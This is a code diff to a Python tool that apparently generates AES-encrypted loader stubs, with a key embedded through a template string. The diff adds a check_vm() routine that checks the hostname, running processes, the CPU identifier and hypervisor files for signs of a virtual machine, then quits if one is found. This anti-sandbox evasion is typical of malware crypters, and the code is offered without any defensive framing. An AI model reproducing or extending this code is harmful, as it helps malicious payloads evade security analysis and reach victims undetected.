@@ -5,6 +5,7 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from colorama import Fore, Style
 import random
+from tkinter import *
 
 
 def generate_random_key(key_size):
@@ -50,6 +51,40 @@ from Crypto.Cipher import AES
 import subprocess
 import os
 import sys
+import platform
+import psutil
+
+def check_vm():
+    # Check for common virtualization-related artifacts
+
+    # Check if the machine's hostname contains common VM-related strings
+    hostname = platform.node().lower()
+    vm_strings = ["virtual", "vmware", "vbox", "qemu", "xen"]
+    for vm_string in vm_strings:
+        if vm_string in hostname:
+            return True
+
+    # Check for known virtualization software processes
+    virtualization_processes = ["vmtoolsd.exe", "vboxservice.exe", "qemu-ga.exe"]
+    for process in psutil.process_iter(attrs=['name']):
+        if process.info['name'].lower() in virtualization_processes:
+            return True
+
+    # Check if the CPU vendor ID contains common VM-related strings
+    cpu_vendor_id = platform.processor().lower()
+    cpu_vm_strings = ["kvm", "vmware", "virtualbox"]
+    for vm_string in cpu_vm_strings:
+        if vm_string in cpu_vendor_id:
+            return True
+
+    # Check if it's running inside a virtualized environment
+    if os.path.exists('/sys/hypervisor/uuid') or os.path.exists('/proc/scsi/scsi'):
+        return True
+
+    return False
+
+if check_vm():
+    quit()
 
 # Get key and IV from user input
 key = '{key.hex()}'
